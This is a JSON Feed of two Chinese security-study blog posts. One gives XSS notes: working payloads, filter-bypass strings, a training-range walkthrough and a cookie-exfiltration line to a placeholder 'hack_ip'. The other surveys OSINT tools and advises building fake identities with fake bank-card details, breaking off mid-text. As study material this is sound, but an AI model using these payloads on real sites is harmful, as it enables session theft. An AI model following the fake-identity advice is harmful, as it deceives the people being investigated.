{
    "version": "https://jsonfeed.org/version/1",
    "title": "学无止境",
    "subtitle": "与众不同，就一定会痛苦",
    "icon": "http://example.com/images/favicon.ico",
    "description": "繁星不怕被看作流萤",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/04/12/Internet%20Security/XSS/",
            "url": "http://example.com/2023/04/12/Internet%20Security/XSS/",
            "title": "XSS",
            "date_published": "2023-04-12T13:27:07.000Z",
            "content_html": "<h1 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h1><p><a name=\"b\"></a></p>\n<h2 id=\"XSS攻击的原理是什么？\"><a href=\"#XSS攻击的原理是什么？\" class=\"headerlink\" title=\"XSS攻击的原理是什么？\"></a>XSS攻击的原理是什么？</h2><p>​    简单来说就是把用户输入的数据当做前端代码执行。（一般通过js的形式运行）<br><a name=\"b\"></a></p>\n<h3 id=\"XSS攻击有哪些类型？区别是什么？\"><a href=\"#XSS攻击有哪些类型？区别是什么？\" class=\"headerlink\" title=\"XSS攻击有哪些类型？区别是什么？\"></a>XSS攻击有哪些类型？区别是什么？</h3><p><br><strong>存储型</strong>:常出现在信息修改添加等地方，导致恶意代码被存储在数据库中，每当被攻击者访问到后就会触发执行；<br><strong>反射型</strong>：常出现在url中，一般需要攻击者提前构造好恶意链接，欺骗用户点击，触发攻击代码；<br><strong>DOM型</strong>：攻击代码在url中，然后输出在了浏览器的DOM节点中。<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDM4NjY2MDY=\">DOM节点</span>（简单来讲就是文本节点如）<br><strong>简单比较会发现，存储和反射都经过服务器，而DOM是纯前端。</strong><br><a name=\"b\"></a></p>\n<h2 id=\"常见的XSS攻击\"><a href=\"#常见的XSS攻击\" class=\"headerlink\" title=\"常见的XSS攻击\"></a>常见的XSS攻击</h2><p>(xss的攻击关键是闭合)<br>1）基本形式</p>\n<pre><code class=\"js\">&lt;script&gt;alert(1)&lt;script&gt;   &lt;script&gt;alert`1`&lt;/script&gt;\n&lt;a href=&quot;javascript:alert(1)&quot;&gt; ###可以不加引号\n&lt;img src=x onerror=&quot;alert(1)&quot;&gt;\n&lt;input onclick=&quot;alert(1)&quot;&gt;  \n</code></pre>\n<ol start=\"2\">\n<li>绕过防火墙</li>\n</ol>\n<pre><code class=\"js\">大小写双写       scrIpT scrscriptipt\n注释 //  /**/   &lt;!--&gt;&lt;--&gt; &lt;!--&gt;&lt;--!&gt;\n特殊字符 ſ      有时候可以当成script  == script\n换行            onclick=\n                        alert(1)\n远程js加载      &lt;a href=&quot;http://[access_ip]/xx.js&quot;&gt; 有一个这个网站可以访问的ip(有时可以是本地127.0.0.1）\n</code></pre>\n<ol start=\"3\">\n<li>nc 连接</li>\n</ol>\n<pre><code class=\"js\">&lt;script&gt;var img=document.getElement(&quot;img&quot;);img.src=&quot;http://hack_ip/a?:4444&quot;+escape(document.cookie);&lt;/script&gt;\n</code></pre>\n<p><a name=\"WqnHs\"></a></p>\n<h2 id=\"注：如果是input型一般不需要加-视情况而论\"><a href=\"#注：如果是input型一般不需要加-视情况而论\" class=\"headerlink\" title=\"注：如果是input型一般不需要加 视情况而论\"></a>注：如果是input型一般不需要加<script> </script>视情况而论</h2><blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3Rlc3QuY3RmOC5jb20vbGV2ZWwxLnBocA==\">以靶场来举例</span><br>href不需再加&lt;a href=””        直接输javascript:alert(8)<br>————–<br></p>\n<pre><code class=\"js\">&gt; 1.level1.php?name=1---------    (简单)&lt;br /&gt;2.level2.  haha&quot;&gt;&lt;script&gt;alert(5)&lt;/script&gt;//----------------(闭合)&lt;br /&gt;3.(&lt;、&gt;、\\)被转意了&lt;br /&gt;F1.haha&#39;onclick=&#39;alert(8)  补全     &#39;&gt;-----------需要按键触发&lt;br /&gt;F2.haha&#39;oninput=&#39;alert(8)           &#39;&gt;-----------需要输入触发&lt;br /&gt;F3.haha&#39;onmouseover=&#39;alert(8)\n\n&gt; 4.同3&lt;br /&gt;5.将&lt;script&gt;替换为&lt;scr_ipt&gt;        on变为o_n&lt;br /&gt;用a标签+伪协议  &lt;br /&gt;aa&quot;&gt;&lt;a href=&quot;javascript:alert(8)&quot;&lt;/a&gt;// ------------点击触发&lt;br /&gt;或aa&quot;&gt;&lt;a href=&quot;javascript:alert(8)&quot;)&quot;nice&lt;/a&gt;&quot;\n\n&gt; 6.将on----o_n  ,  href---hr_ef   ,script----scr_ipt&lt;br /&gt;直接大写绕过on---On,href----HrEf,script---ScRiPt&lt;br /&gt;如:aa&quot;&gt;&lt;a HrEf=&quot;javasCRipt:alert(8)&quot;&lt;/a&gt;//\n\n&gt; 7.标签script被屏蔽&lt;br /&gt;双写绕过scscriptript\n\n&gt; 8.a标签&lt;a href=&quot;nice try!&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;&lt;br /&gt;且href---hr_ef&lt;br /&gt;有大小写屏蔽&lt;br /&gt;注：有了href就不需加href了---aa&quot;&gt;&lt;a href=&quot;javascript:alert(9)&quot;是错的&lt;br /&gt;直接对p进行实体编码(Unicode编码)&lt;br /&gt;javascri&amp;#112;t:alert(8)\n\n&gt; 9.有一个链接合法检测  检测有无关键词http://&lt;br /&gt;对on href script屏蔽&lt;br /&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;javasc&amp;#114;ipt:alert(8)//http://------用//将http://注释掉\n\n&gt; 10.&amp;t_link=1&amp;t_history=2&amp;t_sort=3       -----(隐藏问题)&lt;br /&gt;看代码找input&lt;br /&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;&lt;br /&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;&lt;br /&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;3&quot; type=&quot;hidden&quot;&gt;&lt;br /&gt;把type=&quot;hidden&quot;-----type=&quot;&quot;&lt;br /&gt;&amp;t_sort=3&quot; type=&quot;&quot;oninput=&#39;alert(8)&#39;//\n</code></pre>\n</blockquote>\n<p><a name=\"b\"></a></p>\n<h2 id=\"XSS攻击如何防范？\"><a href=\"#XSS攻击如何防范？\" class=\"headerlink\" title=\"XSS攻击如何防范？\"></a>XSS攻击如何防范？</h2><ul>\n<li>对输入数据进行Html Encode 处理，白名单过滤，过滤JavaScript 事件的标签，开启http-only，装WAF等。</li>\n</ul>\n<h5 id=\"XSS利用工具\"><a href=\"#XSS利用工具\" class=\"headerlink\" title=\"XSS利用工具\"></a><strong>XSS利用工具</strong></h5><p><a name=\"b\"></a></p>\n<h2 id=\"XSSstrike\"><a href=\"#XSSstrike\" class=\"headerlink\" title=\"XSSstrike\"></a>XSSstrike</h2><h2 id><a href=\"#\" class=\"headerlink\" title></a><img data-src=\"https://3.bp.blogspot.com/-O7iiAsYG62A/WrSfaXsBtgI/AAAAAAAAKpw/TXjnhCF-8MUkiqksHFpUnf5LqfyO25fbwCLcBGAs/s1600/XSStrike_6.png\" alt=\" \"></h2><ul>\n<li><p>XSStrike 是一个跨站点脚本检测套件，配备了四个手写解析器、一个智能负载生成器、一个强大的模糊引擎和一个速度极快的爬虫。</p>\n</li>\n<li><p>XSStrike 不像所有其他工具那样注入有效载荷并检查它是否正常工作，而是使用多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效载荷</p>\n</li>\n<li><p>除此之外，XSStrike 还具有爬虫、模糊测试、参数发现、WAF 检测等功能。它还会扫描 DOM XSS 漏洞。</p>\n<h1 id=\"主要特点：\"><a href=\"#主要特点：\" class=\"headerlink\" title=\"主要特点：\"></a>主要特点：</h1><ul>\n<li>反射和 DOM XSS 扫描</li>\n</ul>\n<ul>\n<li><p>多线程爬取</p>\n</li>\n<li><p>上下文分析</p>\n</li>\n<li><p>可配置内核</p>\n</li>\n<li><p>WAF检测和规避</p>\n</li>\n<li><p>过时的 JS 库扫描</p>\n</li>\n<li><p>智能载荷发生器</p>\n</li>\n<li><p>手工制作的 HTML 和 JavaScript 解析器</p>\n</li>\n<li><p>强大的模糊引擎</p>\n</li>\n<li><p>盲 XSS 支持</p>\n</li>\n<li><p>高度研究的工作流程</p>\n</li>\n<li><p>完整的 HTTP 支持</p>\n</li>\n<li><p>来自文件的暴力破解有效载荷</p>\n</li>\n<li><p>由<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9QaG90b24=\">Photon</span>、<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi96ZXRhbml6ZQ==\">Zetanize</span>和<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9Bcmp1bg==\">Arjun提供支持</span></p>\n</li>\n<li><p>载荷编码</p>\n<h4 id=\"用法\"><a href=\"#用法\" class=\"headerlink\" title=\"用法\"></a><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZS93aWtpL1VzYWdl\">用法</span></h4></li>\n</ul>\n</li>\n</ul>\n<p><a name=\"b\"></a></p>\n<h2 id=\"XSSPayload\"><a href=\"#XSSPayload\" class=\"headerlink\" title=\"XSSPayload\"></a>XSSPayload</h2><p>摘自：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gveHNzLXBheWxvYWQtbGlzdA==\">https://github.com/payloadbox/xss-payload-list</span></p>\n<h4 id=\"XSS-Vulnerability-Scanner-Tool’s\"><a href=\"#XSS-Vulnerability-Scanner-Tool’s\" class=\"headerlink\" title=\"XSS Vulnerability Scanner Tool’s :\"></a>XSS Vulnerability Scanner Tool’s :</h4><ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9YU1N0cmlrZQ==\">XSStrike</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoYXdhcmtoYW5ldGhpY2FsaGFja2VyL0JydXRlWFNT\">BruteXSS Terminal</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JhamVzaG1hanVtZGFyL0JydXRlWFNT\">BruteXSS GUI</span><img data-src=\"https://netamooz.net/wp-content/uploads/2016/11/215.Brutexss.3.jpg\"></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3hzcy1zY2FubmVyLmNvbS8=\">XSS Scanner Online</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5rYWxpLm9yZy93ZWItYXBwbGljYXRpb25zL3hzc2Vy\">XSSer</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Rhbk1jSW5lcm5leS94c3NjcmFweQ==\">xsscrapy</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Y4YmxpbmsvQ2hyb21pdW0tYmFzZWQtWFNTLVRhaW50LVRyYWNraW5n\">Cyclops</span></li>\n</ul>\n<h4 id=\"参考-：\"><a href=\"#参考-：\" class=\"headerlink\" title=\"参考 ：\"></a>参考 ：</h4><h6 id=\"跨站点脚本-XSS\"><a href=\"#跨站点脚本-XSS\" class=\"headerlink\" title=\"跨站点脚本 (XSS)\"></a>跨站点脚本 (XSS)</h6><ul>\n<li>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9Dcm9zcy1zaXRlX1NjcmlwdGluZ18oWFNTKQ==\">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</span></li>\n</ul>\n<h6 id=\"XSS（跨站点脚本）预防备忘单\"><a href=\"#XSS（跨站点脚本）预防备忘单\" class=\"headerlink\" title=\"XSS（跨站点脚本）预防备忘单\"></a>XSS（跨站点脚本）预防备忘单</h6><ul>\n<li>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9YU1NfKENyb3NzX1NpdGVfU2NyaXB0aW5nKV9QcmV2ZW50aW9uX0NoZWF0X1NoZWV0\">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</span></li>\n</ul>\n<h6 id=\"基于-DOM-的-XSS-预防备忘单\"><a href=\"#基于-DOM-的-XSS-预防备忘单\" class=\"headerlink\" title=\"基于 DOM 的 XSS 预防备忘单\"></a>基于 DOM 的 XSS 预防备忘单</h6><ul>\n<li>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9ET01fYmFzZWRfWFNTX1ByZXZlbnRpb25fQ2hlYXRfU2hlZXQ=\">https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</span></li>\n</ul>\n<h6 id=\"反射跨站点脚本测试-OTG-INPVAL-001\"><a href=\"#反射跨站点脚本测试-OTG-INPVAL-001\" class=\"headerlink\" title=\"反射跨站点脚本测试 (OTG-INPVAL-001)\"></a>反射跨站点脚本测试 (OTG-INPVAL-001)</h6><ul>\n<li>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9SZWZsZWN0ZWRfQ3Jvc3Nfc2l0ZV9zY3JpcHRpbmdfKE9URy1JTlBWQUwtMDAxKQ==\">https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)</span></li>\n</ul>\n<h6 id=\"测试存储的跨站点脚本-OTG-INPVAL-002\"><a href=\"#测试存储的跨站点脚本-OTG-INPVAL-002\" class=\"headerlink\" title=\"测试存储的跨站点脚本 (OTG-INPVAL-002)\"></a>测试存储的跨站点脚本 (OTG-INPVAL-002)</h6><ul>\n<li>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9TdG9yZWRfQ3Jvc3Nfc2l0ZV9zY3JpcHRpbmdfKE9URy1JTlBWQUwtMDAyKQ==\">https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)</span></li>\n</ul>\n<h6 id=\"测试基于-DOM-的跨站点脚本-OTG-CLIENT-001\"><a href=\"#测试基于-DOM-的跨站点脚本-OTG-CLIENT-001\" class=\"headerlink\" title=\"测试基于 DOM 的跨站点脚本 (OTG-CLIENT-001)\"></a>测试基于 DOM 的跨站点脚本 (OTG-CLIENT-001)</h6><ul>\n<li>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9ET00tYmFzZWRfQ3Jvc3Nfc2l0ZV9zY3JpcHRpbmdfKE9URy1DTElFTlQtMDAxKQ==\">https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)</span></li>\n</ul>\n<h6 id=\"基于-DOM-的-XSS\"><a href=\"#基于-DOM-的-XSS\" class=\"headerlink\" title=\"基于 DOM 的 XSS\"></a>基于 DOM 的 XSS</h6><ul>\n<li>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9ET01fQmFzZWRfWFNT\">https://www.owasp.org/index.php/DOM_Based_XSS</span></li>\n</ul>\n<h6 id=\"跨站点脚本-XSS-备忘单-维拉代码\"><a href=\"#跨站点脚本-XSS-备忘单-维拉代码\" class=\"headerlink\" title=\"跨站点脚本 (XSS) 备忘单 | 维拉代码\"></a>跨站点脚本 (XSS) 备忘单 | 维拉代码</h6><ul>\n<li>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmVyYWNvZGUuY29tL3NlY3VyaXR5L3hzcw==\">https://www.veracode.com/security/xss</span></li>\n</ul>\n<h4 id=\"推荐书籍：\"><a href=\"#推荐书籍：\" class=\"headerlink\" title=\"推荐书籍：\"></a>推荐书籍：</h4><ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rcy5nb29nbGUuY29tLnRyL2Jvb2tzL2Fib3V0L1hTU19BdHRhY2tzLmh0bWw/aWQ9ZFBocURlMFdIWjhD\">XSS 攻击：跨站脚本利用与防御</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFucHViLmNvbS94c3M=\">XSS 备忘单</span></li>\n</ul>\n<h3 id=\"克隆现有存储库（使用-HTTPS-克隆）\"><a href=\"#克隆现有存储库（使用-HTTPS-克隆）\" class=\"headerlink\" title=\"克隆现有存储库（使用 HTTPS 克隆）\"></a>克隆现有存储库（使用 HTTPS 克隆）</h3><pre><code>root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/xss-payload-list.git\n</code></pre>\n<h3 id=\"克隆现有存储库（使用-SSH-克隆）\"><a href=\"#克隆现有存储库（使用-SSH-克隆）\" class=\"headerlink\" title=\"克隆现有存储库（使用 SSH 克隆）\"></a>克隆现有存储库（使用 SSH 克隆）</h3><pre><code>root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/xss-payload-list.git\n</code></pre>\n<p>跨站漏洞的区别<br><a name=\"b\"></a></p>\n<h3 id=\"1-2-4-XSS-CSRF和SSRF区别是什么？\"><a href=\"#1-2-4-XSS-CSRF和SSRF区别是什么？\" class=\"headerlink\" title=\"1.2.4 XSS,CSRF和SSRF区别是什么？\"></a>1.2.4 XSS,CSRF和SSRF区别是什么？</h3><p><br>  <strong>XSS</strong>：跨站脚本攻击；<br>&gt; <strong>CSRF</strong>：跨站请求伪造脚本攻击；<br><strong>SSRF</strong>：服务器请求伪造攻击。<br>区别：<br><strong>XSS</strong>：XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的 脚本语句被执行。<br><strong>CSRF</strong>：CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以 利用用户的Cookie信息伪造用户请求发送至服务器。<br><strong>SSRF</strong>：SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>\n",
            "tags": [
                "网安",
                "Top10"
            ]
        },
        {
            "id": "http://example.com/2023/04/11/Internet%20Security/OSINT/",
            "url": "http://example.com/2023/04/11/Internet%20Security/OSINT/",
            "title": "OSINT",
            "date_published": "2023-04-11T07:39:25.000Z",
            "content_html": "<h3 id=\"1-什么是OSINT\"><a href=\"#1-什么是OSINT\" class=\"headerlink\" title=\"1.什么是OSINT\"></a>1.什么是OSINT</h3><blockquote>\n<p>OSINT（Open-source Intelligence）即开源情报搜集，是用多元化方法进行搜集、分析和通过公开信息进行决策的一种方法。在情报界，Open指的是侵略性、公开的资源.</p>\n</blockquote>\n<blockquote>\n<p>它是一种已被用于国家安全情报活动的方法，其目的是从报纸、新闻、网站和 SNS 等各种信息中预测国家和公司的政策。</p>\n</blockquote>\n<blockquote>\n<p>此外，通过使用 OSINT 收集信息，可以检测泄露的个人信息和机密信息，因此近年来它也被用于防御网络攻击。</p>\n</blockquote>\n<h4 id=\"个人信息检查\"><a href=\"#个人信息检查\" class=\"headerlink\" title=\"个人信息检查\"></a>个人信息检查</h4><blockquote>\n<ol>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXZlaWJlZW5wd25lZC5jb20v\">Have I Been Pwned </span><ul>\n<li>只需输入您的电子邮件地址即可检查您的个人信息是否已被泄露<br><img data-src=\"1.png\" alt=\" \"></li>\n<li>并且当未来发生 pwnage 并且您的帐户被盗用时，您会收到通知。<br><img data-src=\"2.png\" alt=\" \"></li>\n<li>还能进行域名搜索<br>（在整个域中搜索被盗用的帐户并接收未来的通知）<br>  <img data-src=\"3.png\" alt=\" \"></li>\n<li>还会显示一些违规网站<br><img data-src=\"5.png\" alt=\" \"></li>\n<li>还能查看密码是否安全<br><img data-src=\"6.png\" alt=\" \"></li>\n<li>还提供了一些API(当然需要$)</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<h4 id=\"好用的情报工具\"><a href=\"#好用的情报工具\" class=\"headerlink\" title=\"好用的情报工具\"></a>好用的情报工具</h4><blockquote>\n<p>1.<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWFsdGVnby5jb20v\">Maltego</span><br>      Maltego一款非常优秀的信息搜索工具，与其他工具相比，不仅功能强大，而且自动化水平非常高，不需要复杂的命令，就能轻松的完成信息收集。该工具可以通过域名注册，搜索引擎，社交网络，电子邮件等各种渠道搜索信息。主要用于是用于开源情报和取证的软件，可以安装在Windows，Linux，MacOS上。在Kali Linux上是默认安装的，只需要一个域名，便可对互联网上的资源自上而下的搜集。<br> <img data-src=\"7.png\" alt=\" \"></p>\n</blockquote>\n<blockquote>\n<p>2.<span class=\"exturl\" data-url=\"aHR0cHM6Ly91c2Vyc2VhcmNoLm9yZy8=\">UserSearch</span><br>    * UserSearch是一个庞大的用户搜索平台，通过用户名或电子邮件查找某人，可搜索社交网络、约会网站、论坛、加密论坛、聊天网站和博客上。目前已经运行了超过15 年，因此开发人员在用户名或电子邮件地址的OSINT 方面拥有相当强大的地位。开发人员是一个由开源专家和软件开发人员组成的团队。该站点完全免费使用！是迄今为止最全面、最准确的用户名和电子邮件地址在线搜索引擎之一。它还有高级设置，当然也要$.<br> <img data-src=\"8.png\" alt=\" \"></p>\n</blockquote>\n<blockquote>\n<ol start=\"3\">\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3Jrc2VhcmNoLmNvbS8=\">DorkSearch</span><ul>\n<li>这是一项于2022年初创建并向社区发布的免费服务。该工具似乎是exploit-db提供的服务的一种变体，但具有更有用和更广泛的功能。Dorking 基本上是一组可以在Google中使用的半秘密搜索词。使用它们可以显示并非真正打算在Google 中出现的结果！也称为“深网”（不要与暗网/TOR混淆）。</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<pre><code>  * 开发人员基本上为Dorks创建了一个搜索页面。在下图中，您可以看到它们有一个易于点击的界面。随后它可以让你浏览你感兴趣的内容，然后你只需要点击你想要的。\n</code></pre>\n<p>  <img data-src=\"9.png\" alt=\" \"></p>\n<blockquote>\n<ol start=\"4\">\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zY2Ftc2VhcmNoLmlvLw==\">ScamSearch</span><ul>\n<li>个人诈骗者和诈骗网站的全球数据库。迄今为止，被认为OSINT 最大的社区之一。ScamSearc 是一个庞大的诈骗者众包报告数据库。涉及加密货币诈骗、电子邮件、社交网络、离线诈骗、电话诈骗，几乎所有你能想到的诈骗情况，这个网站都会记录下来并免费提供。目前有大约1000万记录在案的诈骗者，并且每周以数千人的速度增长。</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<pre><code>  他们有一个简单的搜索栏，可让在他们的数据库中搜索用户名、电子邮件、加密地址、昵称、真实姓名或网站。鉴于数据库的大小，搜索会很慢，但它是即时的。完全免费的大量诈骗份子数据！由于其众包性质，还鼓励用户使用其服务来举报诈骗者。许多OSINT研究人员和反诈骗社区使用这些数据来瞄准诈骗者并阻碍他们的诈骗工作。\n</code></pre>\n<p> <img data-src=\"10.png\" alt=\" \"></p>\n<blockquote>\n<ol start=\"5\">\n<li>Mitaka(一个扩展程序）<ul>\n<li>这是浏览器中非常方便的一组工具，这可作为Chrome扩展程序使用，也可用于Firefox。它允许在十几个主要搜索引擎中搜索域、URL、IP 地址、MD5 哈希、ASN 和比特币地址。</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<blockquote>\n<ol start=\"6\">\n<li>Spiderfoot<br>[下载地址]（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NtaWNhbGxlZi9zcGlkZXJmb290P3JlZj1kJUVGJUJDJTg5\">https://github.com/smicallef/spiderfoot?ref=d）</span><br>   <img data-src=\"11.png\" alt=\" \"><img data-src=\"12.png\" alt=\" \"><ul>\n<li>这是一个免费的侦察工具，可自动查询 100 多个公共数据源 (OSINT)，以收集有关IP地址、域名、电子邮件地址、姓名等的情报信息。只需指定要调查的目标，选择要启用的模块，然后 SpiderFoot 将收集数据以了解所有实体以及它们之间的关系。扫描返回的数据将揭示有关目标的大量信息，从而深入了解可能的数据泄漏、漏洞或其他敏感信息，这些信息可在渗透测试、红队演习或威胁情报中被利用。</li>\n<li>还可以在 SpiderFoot 扫描中定位以下实体：</li>\n</ul>\n</li>\n</ol>\n</blockquote>\n<pre><code>      * IP地址\n      * 域名/子域名\n      * 主机名\n      * 网络子网 (CIDR)\n      * ASN\n      * 电子邮件地址\n      * 电话号码\n      * 用户名\n      * 人名\n      * 比特币地址\n</code></pre>\n<blockquote>\n<h5 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h5><p>稳定构建（打包发布）：</p>\n</blockquote>\n<pre><code class=\"cmd\">wget https://github.com/smicallef/spiderfoot/archive/v4.0.tar.gz\ntar zxvf v4.0.tar.gz\ncd spiderfoot-4.0\npip install -r requirements.txt\npython ./sf.py -l 127.0.0.1:5001\n</code></pre>\n<blockquote>\n<p>开发构建（克隆 git master 分支）：</p>\n</blockquote>\n<pre><code class=\"cmd\"> git clone https://github.com/smicallef/spiderfoot.git\n cd spiderfoot\n pip install -r requirements.txt\n python ./sf.py -l 127.0.0.1:5001\n</code></pre>\n<blockquote>\n<ol start=\"7\">\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9idWlsdHdpdGguY29tLw==\">BuiltWith</span></li>\n</ol>\n</blockquote>\n<ul>\n<li>查找构建网站的工具！<br><img data-src=\"13.png\" alt=\" \"></li>\n<li>Builtiwth，定位于是一个网站分析工具、竞争对手情报工具和网站优化工具，可以分析网站使用了哪些技术堆栈。例如，它可以检测网站是否是使用WordPress、Joomla或任何其他类似CMS 的平台构建的。它还将生成网站当前正在使用的插件、其框架甚至是公开可用的服务器信息的服务列表。可以将此工具与安全扫描程序（例如 WPScan）和 WordPress 漏洞数据库 API 链接。这可以快速发现正在使用的 WordPress 模块中的常见漏洞。这个分析工具除开技术方面的分析，对于商业品牌而言，分析竞手方面也是不错的应用。</li>\n</ul>\n<blockquote>\n<ol start=\"8\">\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vc2ludGZyYW1ld29yay5jb20v\">OSINT Framework Resource</span></li>\n</ol>\n</blockquote>\n<ul>\n<li>OSINT 框架专注于从免费工具或资源中收集信息。目的是帮助人们找到免费的 OSINT 资源。包含的某些站点可能需要注册或以 $$$ 的价格提供更多数据，但您应该能够免费获得至少一部分可用信息。<br><img data-src=\"14.png\" alt=\" \"></li>\n</ul>\n<blockquote>\n<ol start=\"9\">\n<li>OneforAll<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9PbmVGb3JBbGw=\">摘自</span><br>一款强大的子域收集工具</li>\n<li>基于python 3.6.0及以上版本,cmd中查看<br><code>pyton -V</code><br>这里我们用git来下载<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXQtc2NtLmNvbS9ib29rL3poL3YyLyVFOCVCNSVCNyVFNiVBRCVBNS0lRTUlQUUlODklRTglQTMlODUtR2l0\">GIT安装</span></li>\n</ol>\n</blockquote>\n<pre><code class=\"cmd\">git clone https://gitee.com/shmilylty/OneForAll.git\n或git clone https://github.com/shmilylty/OneForAll.git\n</code></pre>\n<ul>\n<li>安装<ul>\n<li>1.0cmd中输入<br><code>cd OneforAll</code></li>\n<li>2.0安装依赖<pre><code class=\"cmd\">python -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/\npip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/\n</code></pre>\n</li>\n<li>3.0更新<pre><code class=\"cmd\">git stash        # 暂存本地的修改\ngit fetch --all  # 拉取项目更新\ngit pull         # 下载覆盖\ngit stash pop    # 释放本地修改\n</code></pre>\n<blockquote>\n<p>演示<br>我这边是用example.com来演示的,大家可以换成其他域名</p>\n</blockquote>\n<pre><code class=\"cmd\">python oneforall.py --target example.com run\n或\npython oneforall.py --targets ./example.txt run\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>运行后就是这样的了<br><img data-src=\"15.png\" alt=\" \"> </li>\n<li>之后找到OneforAll文件夹中的results<br><img data-src=\"16.png\" alt=\" \"></li>\n<li>打开<br><img data-src=\"17.png\" alt=\" \"><br><img data-src=\"18.png\" alt=\" \"> </li>\n</ul>\n<h3 id=\"现在让我们开始OSNIT\"><a href=\"#现在让我们开始OSNIT\" class=\"headerlink\" title=\"现在让我们开始OSNIT\"></a>现在让我们开始OSNIT</h3><ul>\n<li>前言:以下内容为油管Cyber Mentor老师关于OSINT相关知识的笔记，在国内部分内容不一定能够实操，但是知识点有一定的借鉴性。</li>\n</ul>\n<blockquote>\n<ol>\n<li>为什么我们需要Fake identity<ul>\n<li>在进行OSINT的时候，我们为了不让目标发现我们正在探测他，有时候我们需要一个Fake 微信账户、Fake 求职账户、Fake Twitter账户，诸如此类。这个账户不应该绑定真实的IP信息、手机信息等个人信息。</li>\n</ul>\n</li>\n<li>如何创建Fake identity<ol>\n<li>可以使用AI生成的fake头像<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGhpc3BlcnNvbmRvZXNub3RleGlzdC5jb20v\">AI</span></li>\n<li>可以使用配套的虚假信息</li>\n<li>可以使用Fake的个人邮件、银行卡信息<span 